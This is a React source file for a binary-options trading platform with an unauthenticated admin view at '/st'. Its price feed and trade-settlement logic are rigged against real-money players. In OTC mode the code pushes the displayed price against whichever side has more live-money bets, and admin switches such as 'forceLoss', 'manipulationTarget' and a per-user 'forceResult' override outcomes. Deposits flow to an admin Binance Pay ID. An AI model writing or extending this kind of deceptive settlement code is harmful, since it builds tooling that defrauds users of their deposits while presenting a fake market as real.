
import React, { useState, useEffect, useRef } from 'react';
import { Asset, CandleData, Trade, MarketSettings, User, AssetType, PaymentRequest } from './shared/types.ts';
import { INITIAL_ASSETS } from './shared/constants.ts';
import UserPanel from './user/UserPanel.tsx';
import AdminPanel from './admin/AdminPanel.tsx';
import { ToastContainer, notify } from './shared/notify';
import { ConfirmDialog } from './shared/confirm';

const App: React.FC = () => {
  const [viewMode, setViewMode] = useState<'USER' | 'ADMIN'>(() => {
    if (typeof window !== 'undefined' && window.location.pathname === '/st') return 'ADMIN';
    return 'USER';
  });

  useEffect(() => {
    const handlePopState = () => {
      if (typeof window === 'undefined') return;
      setViewMode(window.location.pathname === '/st' ? 'ADMIN' : 'USER');
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  const navigateTo = (mode: 'USER' | 'ADMIN') => {
    if (typeof window === 'undefined') {
      setViewMode(mode);
      return;
    }
    const targetPath = mode === 'ADMIN' ? '/st' : '/';
    if (window.location.pathname !== targetPath) {
      window.history.pushState({}, '', targetPath);
    }
    setViewMode(mode);
  };
  
  // Managed Assets State
  const [assets, setAssets] = useState<Asset[]>(INITIAL_ASSETS);
  
  const [selectedAsset, setSelectedAsset] = useState<Asset>(INITIAL_ASSETS[0]);
  const [candleHistory, setCandleHistory] = useState<CandleData[]>([]);
  const [currentPrice, setCurrentPrice] = useState<number>(INITIAL_ASSETS[0].price);
  
  // Account State
  const [demoBalance, setDemoBalance] = useState<number>(10000);
  const [liveBalance, setLiveBalance] = useState<number>(0);
  const [activeAccount, setActiveAccount] = useState<'DEMO' | 'LIVE'>('DEMO');

  const [activeTrades, setActiveTrades] = useState<Trade[]>([]);
  const [selectedTimeFrame, setSelectedTimeFrame] = useState<string>('1m');

  // Payment Requests State
  const [paymentRequests, setPaymentRequests] = useState<PaymentRequest[]>([]);
  
  // Mock User List for Admin Simulation
  const [users, setUsers] = useState<User[]>([
    { 
      id: '1', 
      name: 'Demo User', 
      email: 'user@geminix.pro', 
      password: 'password123', 
      balance: 0, 
      bonusBalance: 0,
      status: 'ACTIVE', 
      forceResult: 'NONE', 
      maxBetSize: 1000,
      dailyProfitLimit: 5000,
      payoutOverride: 0,
      tradeDelayMs: 0,
      joinedAt: Date.now() - 86400000 * 5,
      ipAddress: '192.168.1.10',
      country: 'Bangladesh',
      device: 'Chrome / Windows 11',
      lastLogin: Date.now() - 3600000,
      totalDeposited: 0,
      totalWithdrawn: 0,
      totalTurnover: 0,
      netPnL: 0,
      isBalanceFrozen: false,
      forcePasswordReset: false,
      twoFactorEnabled: false,
      kycStatus: 'PENDING',
      riskScore: 15,
      riskLabel: 'REGULAR',
      tags: ['Trusted', 'Early Adopter'],
      activityLogs: [
        { id: 'l1', action: 'Login', timestamp: Date.now() - 3600000, ip: '192.168.1.10', details: 'Successful login from Dhaka', type: 'INFO' }
      ],
      adminNotes: [
        { id: 'n1', content: 'New user registered.', date: Date.now() - 80000000, author: 'Admin' }
      ],
    }
  ]);

  const [marketSettings, setMarketSettings] = useState<MarketSettings>({
    marketMode: 'OTC',
    payoutMultiplier: 1.0,
    marketTrend: 'RANDOM',
    otcLossPercentage: 30,
    manipulationTarget: ['LIVE'],
    forceLoss: false,
    isKillSwitchActive: false,
    maintenanceMode: false,
    globalAnnouncement: '',
    activeSymbols: INITIAL_ASSETS.map(a => a.symbol),
    investmentShortcuts: [10, 50, 100, 500],
    minInvestment: 1,
    maxInvestment: 5000,
    activeTimeFrames: ['5s', '10s', '15s', '30s', '1m', '2m', '3m', '5m', '10m', '15m', '30m', '1h', '4h', '1d'],
    activeTradeDurations: [5, 30, 60, 300],
    aiAnalyst: {
      isEnabled: false, 
      status: 'ACTIVE',
      maintenanceMessage: 'System upgrading for better accuracy.',
      minConfidence: 60,
      targetDevices: ['DESKTOP'],
      targetUsers: [],
      targetIps: [],
      activeUntil: null
    },
    adminBinancePayId: '548293012',
    isLeaderboardEnabled: true,
    leaderboardConfig: {
      minTradeCount: 1,
      minTradeVolume: 0,
      rankingBasis: 'NET_PROFIT',
      excludedUserIds: [],
      autoRefreshEnabled: false,
      refreshInterval: 30
    }
  });

  const wsRef = useRef<WebSocket | null>(null);
  const priceRef = useRef(currentPrice);
  useEffect(() => { priceRef.current = currentPrice; }, [currentPrice]);
  const tradesRef = useRef(activeTrades);
  useEffect(() => { tradesRef.current = activeTrades; }, [activeTrades]);

  useEffect(() => {
    setUsers(prev => prev.map(u => u.id === '1' ? { ...u, balance: liveBalance } : u));
  }, [liveBalance]);

  const handleDepositRequest = (amount: number, txId: string, proof: string) => {
    const newRequest: PaymentRequest = {
        id: Math.random().toString(36).substr(2, 9),
        userId: '1',
        userName: 'Demo User',
        type: 'DEPOSIT',
        amount,
        method: 'BINANCE_PAY',
        status: 'PENDING',
        date: Date.now(),
        transactionId: txId,
        proofUrl: proof
    };
    setPaymentRequests(prev => [newRequest, ...prev]);
    notify.success("Deposit request submitted!");
  };

  const handleWithdrawRequest = (amount: number, targetPayId: string) => {
    if (liveBalance < amount) {
      notify.error("Insufficient Balance");
      return;
    }
    setLiveBalance(prev => prev - amount);
    const newRequest: PaymentRequest = {
        id: Math.random().toString(36).substr(2, 9),
        userId: '1',
        userName: 'Demo User',
        type: 'WITHDRAWAL',
        amount,
        method: 'BINANCE_PAY',
        status: 'PENDING',
        date: Date.now(),
        targetWallet: targetPayId
    };
    setPaymentRequests(prev => [newRequest, ...prev]);
    notify.success("Withdrawal request submitted.");
  };

  const handleAdminPaymentAction = (reqId: string, action: 'APPROVED' | 'REJECTED') => {
    setPaymentRequests(prev => prev.map(req => {
        if (req.id !== reqId) return req;
        if (req.type === 'DEPOSIT' && action === 'APPROVED' && req.status === 'PENDING') {
            setLiveBalance(b => b + req.amount);
        }
        if (req.type === 'WITHDRAWAL' && action === 'REJECTED' && req.status === 'PENDING') {
            setLiveBalance(b => b + req.amount);
        }
        return { ...req, status: action };
    }));
  };

  useEffect(() => {
    const checkSchedules = () => {
        const currentHour = new Date().getUTCHours();
        setAssets(prevAssets => prevAssets.map(asset => {
            if (asset.payoutSchedule && asset.payoutSchedule.length > 0) {
                const activeSchedule = asset.payoutSchedule.find(
                    s => currentHour >= s.startHour && currentHour < s.endHour
                );
                if (activeSchedule) return { ...asset, payout: activeSchedule.payout };
            }
            return asset;
        }));
    };
    checkSchedules();
    const interval = setInterval(checkSchedules, 30000);
    return () => clearInterval(interval);
  }, [assets.length]);

  const generateMockHistory = (basePrice: number, interval: string): CandleData[] => {
    const candles: CandleData[] = [];
    const now = Date.now();
    let seconds = 60;
    if (interval.endsWith('s')) seconds = parseInt(interval.slice(0, -1));
    if (interval.endsWith('m')) seconds = parseInt(interval.slice(0, -1)) * 60;
    if (interval.endsWith('h')) seconds = parseInt(interval.slice(0, -1)) * 3600;
    if (interval.endsWith('d')) seconds = parseInt(interval.slice(0, -1)) * 86400;
    let price = basePrice;
    for (let i = 300; i > 0; i--) {
        const time = now - (i * seconds * 1000);
        const change = (Math.random() - 0.5) * (basePrice * 0.002);
        const open = price;
        const close = price + change;
        const high = Math.max(open, close) + Math.random() * (basePrice * 0.0005);
        const low = Math.min(open, close) - Math.random() * (basePrice * 0.0005);
        candles.push({ time: new Date(time).toISOString(), open, high, low, close, volume: Math.random() * 1000 });
        price = close;
    }
    return candles;
  };

  const fetchHistory = async (asset: Asset, interval: string) => {
    try {
      const isBinanceSupported = asset.type === AssetType.CRYPTO;
      const isRealMode = marketSettings.marketMode === 'REAL' && !asset.forceOTC;
      if (isRealMode && isBinanceSupported) {
        const bSymbol = asset.symbol.replace('/', '').toUpperCase();
        let fetchInterval = '1m';
        if (interval.endsWith('s')) fetchInterval = '1s';
        else if (['1m','3m','5m','15m','30m','1h','4h','1d'].includes(interval)) fetchInterval = interval;
        else if (interval === '2m') fetchInterval = '1m'; 
        else if (interval === '10m') fetchInterval = '5m';
        const response = await fetch(`https://data-api.binance.vision/api/v3/klines?symbol=${bSymbol}&interval=${fetchInterval}&limit=300`);
        const data = await response.json();
        const formatted: CandleData[] = data.map((d: any) => ({
            time: new Date(d[0]).toISOString(), open: parseFloat(d[1]), high: parseFloat(d[2]), low: parseFloat(d[3]), close: parseFloat(d[4]), volume: parseFloat(d[5])
        }));
        setCandleHistory(formatted);
        if (formatted.length > 0) setCurrentPrice(formatted[formatted.length - 1].close);
      } else {
          const mockData = generateMockHistory(asset.price, interval);
          setCandleHistory(mockData);
          setCurrentPrice(mockData[mockData.length - 1].close);
      }
    } catch (e) { 
      const mockData = generateMockHistory(asset.price, interval);
      setCandleHistory(mockData);
    }
  };

  useEffect(() => {
    if (viewMode !== 'USER') return;
    fetchHistory(selectedAsset, selectedTimeFrame);
    const isRealMode = marketSettings.marketMode === 'REAL' && !selectedAsset.forceOTC;
    if (isRealMode && selectedAsset.type === AssetType.CRYPTO) {
        const bSymbol = selectedAsset.symbol.replace('/', '').toLowerCase();
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/${bSymbol}@kline_1s`);
        ws.onmessage = (event) => {
            const k = JSON.parse(event.data).k;
            setCurrentPrice(parseFloat(k.c));
        };
        wsRef.current = ws;
        return () => ws.close();
    } else {
        const interval = setInterval(() => {
            setCurrentPrice(prev => {
                const naturalMove = (Math.random() - 0.5) * (prev * 0.0002); 
                let bias = 0;
                const isOTCActive = marketSettings.marketMode === 'OTC' || selectedAsset.forceOTC;
                if (isOTCActive) {
                    if (marketSettings.marketTrend === 'PUMP') bias += prev * 0.00005;
                    else if (marketSettings.marketTrend === 'DUMP') bias -= prev * 0.00005;
                    const openTradesForAsset = tradesRef.current.filter(t => t.assetSymbol === selectedAsset.symbol && t.status === 'OPEN');
                    if (openTradesForAsset.length > 0 && marketSettings.otcLossPercentage > 0) {
                        const targetLive = marketSettings.manipulationTarget.includes('LIVE');
                        const targetDemo = marketSettings.manipulationTarget.includes('DEMO');
                        const liveTrades = openTradesForAsset.filter(t => t.accountType === 'LIVE');
                        const demoTrades = openTradesForAsset.filter(t => t.accountType === 'DEMO');
                        let volumeCall = 0; let volumePut = 0; let activeLogic = false;
                        if (targetLive && liveTrades.length > 0) {
                            volumeCall = liveTrades.filter(t => t.type === 'CALL').reduce((sum, t) => sum + t.amount, 0);
                            volumePut = liveTrades.filter(t => t.type === 'PUT').reduce((sum, t) => sum + t.amount, 0);
                            activeLogic = true;
                        } else if (targetDemo && demoTrades.length > 0) {
                            volumeCall = demoTrades.filter(t => t.type === 'CALL').reduce((sum, t) => sum + t.amount, 0);
                            volumePut = demoTrades.filter(t => t.type === 'PUT').reduce((sum, t) => sum + t.amount, 0);
                            activeLogic = true;
                        }
                        if (activeLogic) {
                            const aggression = marketSettings.otcLossPercentage / 100;
                            const pushFactor = prev * 0.00004 * aggression; 
                            const pushNoise = (Math.random() * 0.5) + 0.5;
                            if (volumeCall > volumePut) bias -= (pushFactor * pushNoise);
                            else if (volumePut > volumeCall) bias += (pushFactor * pushNoise);
                        }
                    }
                }
                return prev + naturalMove + bias;
            });
        }, 1000);
        return () => clearInterval(interval);
    }
  }, [selectedAsset, viewMode, selectedTimeFrame, marketSettings.marketMode, marketSettings.marketTrend, marketSettings.otcLossPercentage, marketSettings.manipulationTarget, selectedAsset.forceOTC]);

  useEffect(() => {
    const timer = setInterval(() => {
      setActiveTrades(prev => {
        const now = Date.now();
        let changed = false;
        const executionPrice = priceRef.current; 
        const updated = prev.map(trade => {
          if (trade.status === 'OPEN' && trade.expiryTime <= now) {
            changed = true;
            let status: 'WIN' | 'LOSS' | 'TIE' = 'LOSS';
            if (executionPrice === trade.entryPrice) status = 'TIE';
            else if (trade.type === 'CALL') status = executionPrice > trade.entryPrice ? 'WIN' : 'LOSS';
            else status = executionPrice < trade.entryPrice ? 'WIN' : 'LOSS';
            const assetIsOTC = marketSettings.marketMode === 'OTC' || assets.find(a => a.id === trade.assetId)?.forceOTC;
            if (assetIsOTC) {
                const isTargeted = marketSettings.manipulationTarget.includes(trade.accountType);
                if (isTargeted) {
                    if (marketSettings.marketTrend === 'PUMP' && trade.type === 'CALL') status = 'WIN';
                    if (marketSettings.marketTrend === 'DUMP' && trade.type === 'PUT') status = 'WIN';
                    if (marketSettings.forceLoss) status = 'LOSS';
                }
                const userOverride = users.find(u => u.id === '1')?.forceResult;
                if (userOverride === 'WIN') status = 'WIN';
                if (userOverride === 'LOSS') status = 'LOSS';
            }
            if (status === 'WIN') {
                const profit = trade.amount + (trade.amount * (trade.payoutAtTrade / 100));
                if (trade.accountType === 'LIVE') setLiveBalance(b => b + profit); else setDemoBalance(b => b + profit);
            } else if (status === 'TIE') {
                const refund = trade.amount;
                if (trade.accountType === 'LIVE') setLiveBalance(b => b + refund); else setDemoBalance(b => b + refund);
            }
            return { ...trade, status: status, exitPrice: executionPrice };
          }
          return trade;
        });
        return changed ? updated : prev;
      });
    }, 250);
    return () => clearInterval(timer);
  }, [marketSettings, users]);

  const handleTrade = (type: 'CALL' | 'PUT', amount: number, duration: number) => {
    if (marketSettings.isKillSwitchActive) {
      notify.error("System Maintenance: Trading is temporarily disabled.");
      return;
    }
    const currentBalance = activeAccount === 'LIVE' ? liveBalance : demoBalance;
    if (currentBalance < amount) {
      notify.error("Insufficient Balance");
      return;
    }
    if (activeAccount === 'LIVE') setLiveBalance(b => b - amount); else setDemoBalance(b => b - amount);
    const finalPayout = Math.round(selectedAsset.payout * marketSettings.payoutMultiplier);
    setActiveTrades(prev => [{
      id: Math.random().toString(36).substr(2, 9),
      assetId: selectedAsset.id, assetSymbol: selectedAsset.symbol,
      type, amount, entryPrice: currentPrice,
      startTime: Date.now(), expiryTime: Date.now() + duration * 1000,
      status: 'OPEN', payoutAtTrade: finalPayout,
      userId: '1', accountType: activeAccount
    }, ...prev]);
  };

  const visibleAssets = assets.filter(a => marketSettings.activeSymbols.includes(a.symbol));

  return (
    <div className="flex h-[100dvh] w-screen bg-black text-white overflow-hidden font-sans">
      {viewMode === 'USER' ? (
        <UserPanel 
          selectedAsset={selectedAsset} setSelectedAsset={setSelectedAsset}
          candleHistory={candleHistory} currentPrice={currentPrice} 
          balance={activeAccount === 'LIVE' ? liveBalance : demoBalance}
          accountType={activeAccount} setAccountType={setActiveAccount}
          demoBalance={demoBalance} liveBalance={liveBalance}
          onResetDemo={(amount) => setDemoBalance(amount !== undefined ? amount : 10000)}
          activeTrades={activeTrades} selectedTimeFrame={selectedTimeFrame}
          setSelectedTimeFrame={setSelectedTimeFrame} marketSettings={marketSettings}
          effectivePayout={Math.round(selectedAsset.payout * marketSettings.payoutMultiplier)} 
          handleTrade={handleTrade} visibleAssets={visibleAssets}
          onExit={() => navigateTo('USER')} paymentRequests={paymentRequests}
          onDeposit={handleDepositRequest} onWithdraw={handleWithdrawRequest}
        />
      ) : (
        <AdminPanel 
          settings={marketSettings} onUpdate={setMarketSettings} 
          trades={activeTrades} users={users} setUsers={setUsers}
          assets={assets} setAssets={setAssets} paymentRequests={paymentRequests}
          onProcessPayment={handleAdminPaymentAction}
        />
      )}
      <ToastContainer />
      <ConfirmDialog />
    </div>
  );
};

export default App;
